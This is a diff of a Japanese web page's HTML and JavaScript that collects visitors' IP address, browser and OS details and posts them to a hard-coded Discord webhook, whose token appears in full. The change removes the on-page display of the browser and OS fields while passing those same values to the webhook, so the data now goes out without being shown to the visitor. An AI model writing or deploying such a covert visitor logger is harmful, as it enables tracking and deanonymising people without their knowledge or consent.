@@ -22,10 +22,6 @@
 <h2>端末情報</h2>
 
 <div class="device-info">
-    <p><span class="info-label">ブラウザ:</span> <span id="browser"></span></p>
-    <p><span class="info-label">ブラウザバージョン:</span> <span id="browserVersion"></span></p>
-    <p><span class="info-label">OS:</span> <span id="os"></span></p>
-    <p><span class="info-label">OSバージョン:</span> <span id="osVersion"></span></p>
     <p><span class="info-label">IPアドレス:</span> <span id="ipAddress"></span></p>
 </div>
 
@@ -66,17 +62,12 @@
         osVersion = userAgent.split("OS ")[1].split(" ")[0];
     }
 
-    document.getElementById("browser").textContent = browser;
-    document.getElementById("browserVersion").textContent = browserVersion;
-    document.getElementById("os").textContent = os;
-    document.getElementById("osVersion").textContent = osVersion;
-
     // IPアドレス取得
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             document.getElementById("ipAddress").textContent = data.ip;
-            sendDataToDiscord(data.ip);
+            sendDataToDiscord(data.ip, browser, browserVersion, os, osVersion);
         })
         .catch(error => {
             console.error('IPアドレスの取得に失敗しました:', error);
@@ -84,7 +75,7 @@
         });
 
     // DiscordのWebhookにデータを送信する関数
-    function sendDataToDiscord(ipAddress) {
+    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion) {
         var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G'; // ここにDiscordのWebhookのURLを入力してください
         var data = {
             content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '```'
